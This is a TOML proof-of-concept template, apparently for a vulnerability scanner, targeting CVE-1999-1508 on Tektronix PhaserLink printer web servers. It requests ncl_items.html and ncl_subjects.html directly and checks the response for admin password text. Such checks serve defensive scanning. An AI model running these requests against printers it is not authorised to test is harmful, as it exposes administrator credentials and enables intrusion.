[info]
author = "ave"
description = "检测 Tektronix PhaserLink 打印机 Web 服务器是否存在未授权访问漏洞，通过直接请求 ncl_items.html 或 ncl_subjects.html 获取管理员密码"
id = "POC-AVE-1999-1980"
name = "Tektronix PhaserLink Printer Admin Password Disclosure PoC"
severity = "critical"
tags = ["ave-1999-1980"]
vuln_id = [
    "CVE-1999-1508",
    "AVE-1999-1980",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/ncl_items.html"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "Admin",
    "Password",
    "ncl",
]

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/ncl_subjects.html"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "Admin",
    "Password",
    "ncl",
]
